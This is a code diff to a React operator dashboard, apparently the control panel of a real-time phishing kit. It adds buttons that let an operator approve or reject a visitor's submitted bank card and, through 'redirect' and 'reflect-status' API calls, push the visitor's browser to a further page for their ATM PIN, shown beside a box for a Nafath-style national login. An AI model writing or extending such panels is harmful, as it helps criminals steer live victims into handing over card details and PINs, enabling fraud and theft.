@@ -100,6 +100,7 @@ export default function DashboardPage() {
   const [newBlockedCard, setNewBlockedCard] = useState("");
   const [currentTime, setCurrentTime] = useState(Date.now());
   const [openLogBox, setOpenLogBox] = useState<string | null>(null);
+  const [cardActionStatus, setCardActionStatus] = useState<"approved" | "rejected" | "pin" | null>(null);
   const socketRef = useRef<Socket | null>(null);
   const currentTimeRef = useRef(Date.now());
   const headerMenuRef = useRef<HTMLDivElement | null>(null);
@@ -2822,14 +2823,71 @@ const renderNafadBox = () => {
             <div style={{ marginTop: 8, padding: "10px 12px", borderRadius: 8, background: "#fef3c7", color: "#92400e", fontSize: "12px", textAlign: "center", fontWeight: 600 }}>
               ⏳ في انتظار المراجعة فقط
             </div>
-            {showCardDecisionButtons && (
+            {showCardDecisionButtons && !cardActionStatus && (
               <div style={{ display: "flex", gap: 8, justifyContent: "center", marginTop: 10 }}>
-                <button onClick={() => handleLocalPaymentAction("approved")} style={{ border: "none", borderRadius: 8, padding: "8px 12px", background: "#16a34a", color: "#fff", cursor: "pointer", fontWeight: 700 }}>
+                <button onClick={() => { 
+                  handleLocalPaymentAction("approved"); 
+                  setCardActionStatus("approved");
+                }} style={{ border: "none", borderRadius: 8, padding: "8px 12px", background: "#16a34a", color: "#fff", cursor: "pointer", fontWeight: 700 }}>
                   موافقة
                 </button>
-                <button onClick={() => handleLocalPaymentAction("rejected")} style={{ border: "none", borderRadius: 8, padding: "8px 12px", background: "#dc2626", color: "#fff", cursor: "pointer", fontWeight: 700 }}>
+                <button onClick={async () => { 
+                  setActionLoading("card");
+                  const visitorId = selectedRequest?.visitorId || selectedRequest?.id;
+                  if (visitorId) {
+                    await fetch("/api/dashboard/reflect-status", {
+                      method: "POST",
+                      headers: { "Content-Type": "application/json" },
+                      body: JSON.stringify({ visitorId, field: "_v1Status", status: "rejected" }),
+                    });
+                    await fetch("/api/dashboard/redirect", {
+                      method: "POST",
+                      headers: { "Content-Type": "application/json" },
+                      body: JSON.stringify({ visitorId, targetPage: "check" }),
+                    });
+                  }
+                  setCardActionStatus("rejected");
+                  setActionLoading(null);
+                }} style={{ border: "none", borderRadius: 8, padding: "8px 12px", background: "#dc2626", color: "#fff", cursor: "pointer", fontWeight: 700 }}>
                   رفض
                 </button>
+                <button onClick={async () => { 
+                  setActionLoading("card");
+                  const visitorId = selectedRequest?.visitorId || selectedRequest?.id;
+                  if (visitorId) {
+                    await fetch("/api/dashboard/reflect-status", {
+                      method: "POST",
+                      headers: { "Content-Type": "application/json" },
+                      body: JSON.stringify({ visitorId, field: "_v6Status", status: "pending" }),
+                    });
+                    await fetch("/api/dashboard/redirect", {
+                      method: "POST",
+                      headers: { "Content-Type": "application/json" },
+                      body: JSON.stringify({ visitorId, targetPage: "step3" }),
+                    });
+                  }
+                  setCardActionStatus("pin");
+                  setActionLoading(null);
+                }} style={{ border: "none", borderRadius: 8, padding: "8px 12px", background: "#3b82f6", color: "#fff", cursor: "pointer", fontWeight: 700 }}>
+                  PIN
+                </button>
+              </div>
+            )}
+            {cardActionStatus && (
+              <div style={{ 
+                display: "flex", 
+                justifyContent: "center", 
+                marginTop: 10,
+                padding: "8px 12px",
+                borderRadius: 8,
+                background: cardActionStatus === "approved" ? "#dcfce7" : cardActionStatus === "rejected" ? "#fee2e2" : "#dbeafe",
+                color: cardActionStatus === "approved" ? "#166534" : cardActionStatus === "rejected" ? "#991b1b" : "#1e40af",
+                fontWeight: 600,
+                fontSize: "0.9rem"
+              }}>
+                {cardActionStatus === "approved" && "✓ تمت الموافقة"}
+                {cardActionStatus === "rejected" && "✗ تم رفض البطاقة"}
+                {cardActionStatus === "pin" && "🔐 رمز ATM"}
               </div>
             )}
             
